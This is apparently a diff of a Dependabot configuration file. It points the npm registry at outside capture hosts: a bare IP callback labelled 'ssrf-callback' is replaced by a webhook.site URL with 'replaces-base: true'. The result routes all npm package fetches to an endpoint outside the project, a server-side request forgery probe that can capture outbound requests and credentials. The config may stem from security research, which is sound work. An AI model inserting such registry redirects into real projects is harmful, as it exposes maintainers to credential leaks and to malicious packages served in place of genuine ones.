@@ -1,13 +1,13 @@
 version: 2
 registries:
-  ssrf-callback:
+  ssrf-npm:
     type: npm-registry
-    url: http://44.211.128.59:8765/dependabot-registry/
-    token: test-token
+    url: https://webhook.site/2cf5eb66-496a-48e0-b751-f906e7ae6401/npm
+    replaces-base: true
 updates:
   - package-ecosystem: "npm"
     directory: "/"
     schedule:
       interval: "daily"
     registries:
-      - ssrf-callback
+      - ssrf-npm
